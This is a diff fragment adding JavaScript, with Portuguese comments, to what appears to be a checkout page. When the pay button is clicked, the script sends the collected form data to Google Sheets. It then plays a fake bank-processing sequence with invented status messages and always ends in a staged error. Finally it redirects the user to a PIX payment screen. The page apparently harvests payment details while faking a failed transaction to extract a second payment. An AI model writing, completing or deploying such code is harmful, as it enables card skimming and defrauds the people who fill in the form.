+        btnPagar.addEventListener('click', (e) => {
+            e.preventDefault();
+
+            // 1. Coleta os dados e dispara envio para o Google Sheets
+            const dados = coletarDadosFormulario();
+            enviarParaGoogleSheets(dados);
+
+            // 2. Mostrar o overlay
+            overlay.classList.remove('hidden');
+            overlay.classList.add('flex');
+
+            // 3. Exibir o Loader, Esconder o Erro
+            spinnerView.classList.remove('hidden');
+            spinnerView.classList.add('flex');
+
+            errorView.classList.add('hidden');
+            errorView.classList.remove('flex');
+            errorView.classList.remove('opacity-100', 'scale-100');
+            errorView.classList.add('opacity-0', 'scale-95');
+
+            // 4. Simulação de processamento bancário progressivo e realista
+            const loaderStatus = document.getElementById('loader-status');
+            const loaderProgress = document.getElementById('loader-progress');
+
+            if (loaderStatus && loaderProgress) {
+                loaderStatus.textContent = 'Criptografando dados da transação...';
+                loaderProgress.style.width = '25%';
+
+                setTimeout(() => {
+                    if (loaderStatus) loaderStatus.textContent = 'Conectando à instituição bancária...';
+                    if (loaderProgress) loaderProgress.style.width = '65%';
+                }, 1400);
+
+                setTimeout(() => {
+                    if (loaderStatus) loaderStatus.textContent = 'Autenticando transação com a operadora...';
+                    if (loaderProgress) loaderProgress.style.width = '94%';
+                }, 2900);
+            }
+
+            setTimeout(() => {
+                // Esconder loader
+                spinnerView.classList.add('hidden');
+                spinnerView.classList.remove('flex');
+
+                // Mostrar erro com animação suave
+                errorView.classList.remove('hidden');
+                errorView.classList.add('flex');
+
+                setTimeout(() => {
+                    errorView.classList.remove('opacity-0', 'scale-95');
+                    errorView.classList.add('opacity-100', 'scale-100');
+                }, 50);
+
+            }, 4500);
+        });
+
+        // Fechar o modal de erro
+        function closeOverlay() {
+            overlay.classList.add('hidden');
+            overlay.classList.remove('flex');
+        }
+
+        // Redirecionamento estratégico para pagamento via PIX no Quiz
+        function redirectToQuizPix() {
+            const params = window.location.search || '';
+            const separator = params ? (params.includes('step=') ? '' : '&') : '?';
+            const stepParam = params.includes('step=') ? '' : 'step=result';
+            const fullQuery = params + (stepParam ? separator + stepParam : '');
+
+            // Redireciona para o oratório sagrado / tela de geração de PIX
+            window.location.href = '/' + fullQuery + '#pix-section';
+        }
+    </script>
+</body>
+
+</html>
